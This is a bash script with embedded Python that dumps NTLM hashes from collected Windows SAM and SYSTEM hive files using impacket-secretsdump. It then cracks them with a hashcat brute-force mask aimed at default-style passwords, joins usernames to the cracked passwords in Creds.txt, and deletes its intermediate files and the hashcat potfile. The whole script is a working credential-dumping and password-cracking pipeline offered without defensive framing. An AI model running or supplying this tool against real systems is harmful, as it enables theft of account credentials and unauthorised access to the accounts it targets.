#!/bin/bash
file_count=$(find "." -type f | wc -l)
stopping_number=$((file_count / 2))
for ((i = 1; i <= stopping_number; i++)); do
    impacket-secretsdump -sam "SAM$i" -system "SYSTEM$i" LOCAL >> "Output.txt"
done
cat << 'EOF' > Script1.py
with open('Output.txt', 'r') as f1:
    lines = f1.readlines()
usernames_hashes_dict = {}
for line in lines:
    if "\n" in line:
        line = line[:-1]
    if ":::" in line:
        hash_value = line[-35:-3]
        username = line.split(":")[0].strip()
        if any(substring in username for substring in [f"{i:02}" for i in range(100)]):
            key = (username, hash_value)
            if key not in usernames_hashes_dict:
                usernames_hashes_dict[key] = True
with open('Usernames.txt', 'w') as f2:
    for (username, hash_value) in usernames_hashes_dict.keys():
        f2.write(f"{username}:{hash_value}\n")
with open('Usernames.txt', 'r') as f3:
    lines2 = f3.readlines()
with open('Hashes.txt', 'w') as f4:
    for line in lines2:
        f4.write(line[-33:-1]+"\n")
EOF
python3 Script1.py
rm Output.txt && rm Script1.py && rm ~/.local/share/hashcat/hashcat.potfile
hashcat -a 3 -m 1000 Hashes.txt ?l?l?d?d?d?d?d?d
hashcat -a 3 -m 1000 Hashes.txt ?l?l?d?d?d?d?d?d --show > Passwords.txt
rm Hashes.txt
cat << 'EOF' > Script2.py
with open('Usernames.txt', 'r') as user_file:
    user_lines = user_file.readlines()
with open('Passwords.txt', 'r') as pass_file:
    pass_lines = pass_file.readlines()
with open('Creds2.txt', 'w') as creds_file:
    for user_line in user_lines:
        user_info = user_line.strip().split(':')
        username = user_info[0]
        user_hash = user_info[1]
        for pass_line in pass_lines:
            pass_info = pass_line.strip().split(':')
            pass_hash = pass_info[0]
            password = pass_info[1]
            if user_hash == pass_hash:
                creds_file.write(f"{username}:{password}:{user_hash}\n")
                break
        else:
            creds_file.write(f"{username}:not default password:{user_hash}\n")
EOF
python3 Script2.py
sort -t: -k1,1nr -k1.3,1 Creds2.txt > Creds.txt
rm Usernames.txt && rm Passwords.txt && rm Script2.py && rm Creds2.txt

#Developed by V0R73CKZ

